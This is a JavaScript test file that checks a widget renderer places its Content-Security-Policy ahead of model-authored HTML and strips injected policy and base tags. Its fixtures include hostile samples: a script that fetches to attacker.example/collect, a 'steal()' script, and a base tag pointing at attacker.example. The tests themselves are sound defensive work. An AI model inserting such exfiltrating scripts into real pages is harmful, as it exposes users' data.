import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import test from 'node:test'

/**
 * Evaluate the browser bundle far enough to reach its pure helpers.
 *
 * The module only registers a factory, so nothing runs until a fake loader is asked for
 * it: no DOM, no React and no plugin activation is involved.
 */
function loadClientModule() {
  const source = readFileSync(new URL('../lib/client.js', import.meta.url), 'utf8')
  let factory
  const window = { __ModuleLoader__: { load(entry) { factory = entry.factory } } }
  const document = {
    documentElement: { lang: 'en' },
    querySelectorAll: () => [],
    createElement: () => ({ style: {}, appendChild() {}, remove() {} }),
    addEventListener() {},
    removeEventListener() {},
  }
  const navigate = new Function('window', 'document', 'navigator', 'localStorage', source)
  navigate(window, document, { language: 'en', userActivation: { isActive: false } }, {
    getItem: () => null,
    setItem() {},
    removeItem() {},
  })
  assert.equal(typeof factory, 'function', 'the bundle registers one factory')
  const fakeRequire = () => ({
    createElement: () => null,
    useState: () => [null, () => {}],
    useEffect() {},
    useMemo: (compute) => compute(),
    useRef: () => ({ current: null }),
    useCallback: (fn) => fn,
    createContext: () => ({ Provider: null }),
    useContext: () => ({}),
    Fragment: null,
  })
  return factory(fakeRequire)
}

const client = loadClientModule()
const { widgetDocument, WIDGET_CSP } = client.__test
const THEME = { bg: '#fff', text: '#111' }

test('the widget policy is emitted before any model-authored script', () => {
  const html = widgetDocument(`<!doctype html>
<html>
<head>
  <script>fetch('https://attacker.example/collect')</script>
</head>
<body><p>hello</p></body>
</html>`, 'nonce-1', THEME, 'user')

  const policy = html.indexOf('Content-Security-Policy')
  const modelScript = html.indexOf("fetch('https://attacker.example/collect')")
  assert.ok(policy >= 0, 'the policy is present')
  assert.ok(modelScript >= 0, 'the model script survived as content')
  assert.ok(policy < modelScript, 'the policy precedes the model script')
  // The Host bridge is the only script the Host itself emits, and it comes first too.
  assert.ok(html.indexOf('<script>') < modelScript)
  assert.ok(html.startsWith('<!doctype html>'), 'the Host owns the document shell')
})

test('a model document cannot smuggle tags ahead of the policy', () => {
  const html = widgetDocument(`<script>steal()</script><html><head><title>x</title></head><body>ok</body></html>`, 'n2', THEME, 'user')
  const policy = html.indexOf('Content-Security-Policy')
  assert.ok(policy >= 0)
  assert.ok(policy < html.indexOf('steal()'), 'a script written before <head> still lands after the policy')
  assert.equal(html.match(/<html/gu).length, 1, 'the Host emits the only html tag')
  assert.equal(html.match(/<head/gu).length, 1, 'the Host emits the only head tag')
  assert.equal(html.match(/<body/gu).length, 1, 'the Host emits the only body tag')
})

test('a model-supplied policy or base tag is removed', () => {
  const html = widgetDocument(`<html><head>
    <base href="https://attacker.example/">
    <meta http-equiv="Content-Security-Policy" content="default-src *">
  </head><body>ok</body></html>`, 'n3', THEME, 'user')
  assert.equal(html.match(/Content-Security-Policy/gu).length, 1, 'only the Host policy remains')
  assert.equal(html.includes('default-src *'), false, 'the model policy is gone')
  assert.equal(/<base\b/iu.test(html), false, 'a model base tag is gone')
  assert.ok(html.includes(WIDGET_CSP))
})

test('a fragment is wrapped in the same Host shell', () => {
  const html = widgetDocument('<div id="x">hi</div>', 'n4', THEME, 'user')
  assert.ok(html.startsWith('<!doctype html>'))
  assert.ok(html.indexOf('Content-Security-Policy') < html.indexOf('<div id="x">hi</div>'))
  assert.ok(html.includes('<body><div id="x">hi</div></body>'))
})

test('the widget bridge requires activation unless the node opted into programmatic', () => {
  const user = client.__test.widgetBridge('n5', 'user')
  const programmatic = client.__test.widgetBridge('n5', 'programmatic')
  assert.match(user, /var policy="user"/u)
  assert.match(user, /ua!==undefined&&ua\.isActive===true/u, 'the bridge fails closed')
  assert.match(programmatic, /var policy="programmatic"/u)
})
